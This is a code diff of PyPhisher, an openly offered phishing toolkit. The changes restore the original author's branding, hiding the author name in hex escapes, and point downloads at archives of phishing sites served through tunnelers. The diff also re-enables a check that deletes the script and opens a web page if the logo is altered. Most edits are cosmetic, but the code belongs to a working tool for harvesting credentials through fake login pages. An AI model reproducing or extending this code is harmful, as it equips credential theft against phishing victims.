@@ -94,6 +94,9 @@ from zipfile import ZipFile
 
 # Color snippets
 black="\033[0;30m"
+red="\033[0;31m"
+bred="\033[1;31m"
+green="\033[0;32m"
 bgreen="\033[1;32m"
 yellow="\033[0;33m"
 byellow="\033[1;33m"
@@ -105,18 +108,6 @@ cyan="\033[0;36m"
 bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
-red = "\033[31m"
-green = "\033[32m"
-yellow = "\033[33m"
-blue = "\033[34m"
-magenta = "\033[35m"
-bright_white = "\033[97m"
-bright_cyan = "\033[96m"
-bright_green = "\033[92m"
-bright_yellow = "\033[93m"
-bright_red = "\033[91m"
-bright_magenta = "\033[95m"
-reset = "\033[0m"
 
 version="2.1.7"
 
@@ -131,22 +122,19 @@ info2  =   f"{green}[{white}•{green}] {purple}"
 
 # Modifying this could be potentially dangerous
 logo = f"""
-                            
- {bright_white}██╗  ██╗██╗███╗   ██╗ ██████╗ 
-{bright_cyan} ██║ ██╔╝██║████╗  ██║██╔════╝ 
-{bright_green} █████╔╝ ██║██╔██╗ ██║██║  ███╗
-{bright_yellow} ██╔═██╗ ██║██║╚██╗██║██║   ██║
-{bright_red} ██║  ██╗██║██║ ╚████║╚██████╔╝
-{bright_magenta} ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
-
-         {bright_white}I Am Not A KING But I Am The KING Of My {bright_magenta}KINGDOM
-
-{bright_yellow}https://www.github.com/kingk4       
+{red}  _____       _____  _     _     _               
+{cyan} |  __ \     |  __ \| |   (_)   | |              
+{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
+{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
+{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
+{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
+{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
+{cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
 """
 
 
 lx_help = f"""
-{info}Steps: {nc}N
+{info}Steps: {nc}
 {blue}[1]{yellow} Go to {green}https://localxpose.io
 {blue}[2]{yellow} Create an account 
 {blue}[3]{yellow} Login to your account
@@ -238,22 +226,16 @@ cprint = Console().print
 # Get Columns of Screen
 columns = get_terminal_size().columns
 
-repo_url = "https://github.com/kingk4/MaxP_Files/releases/download/P--Pfiles/"
-websites_url = "https://github.com/kingk4/MaxP_Files/releases/download/P--Pfiles/website.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
-
+repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/PyPhisher"
+websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
 # CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
 home = getenv("HOME")
-print(home)
 ssh_dir = f"{home}/.ssh"
-# sites_dir = f"{home}/.websites"
-sites_dir = "/home/king/Desktop/website/"
-print(sites_dir)
+sites_dir = f"{home}/.websites"
 templates_file = f"{sites_dir}/templates.json"
-# tunneler_dir = f"{home}/.tunneler"
-tunneler_dir = "/home/king/Desktop/tunneler/"
-print(tunneler_dir)
+tunneler_dir = f"{home}/.tunneler"
 php_file = f"{tunneler_dir}/php.log"
 cf_file = f"{tunneler_dir}/cf.log"
 lx_file = f"{tunneler_dir}/loclx.log"
@@ -435,11 +417,11 @@ def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
     except Exception as e:
         append(e, error_file)
         
-# if sha256(logo.encode("utf-8")).hexdigest() != "931df196786d840c731d49fec1b43ab15edc7977f4e300bfb4c2e3657b9c591d":
-#     print(f"{info}Visit: {repo_url}")
-#     bgtask(f"xdg-open {repo_url}")
-#     delete(__file__)
-#     exit(1)
+if sha256(logo.encode("utf-8")).hexdigest() != "931df196786d840c731d49fec1b43ab15edc7977f4e300bfb4c2e3657b9c591d":
+    print(f"{info}Visit: {repo_url}")
+    bgtask(f"xdg-open {repo_url}")
+    delete(__file__)
+    exit(1)
 
 
 # Write/Append texts to a file
@@ -1225,7 +1207,6 @@ def requirements():
             zipver=sites_file.read().strip()
             if get_ver(version) > get_ver(zipver):
                 download(websites_url, "websites.zip")
-
     else:
         download(websites_url, "websites.zip")
     if isfile("websites.zip"):
@@ -1315,7 +1296,7 @@ def main_menu():
         if not isdir(site):
             internet()
             delete("site.zip")
-            download("https://github.com/kingk4/MaxP_Files/releases/download/P--Pfiles/website.zip", "site.zip")
+            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
             extract("site.zip", site)
             remove("site.zip")
         copy(site, site_dir)
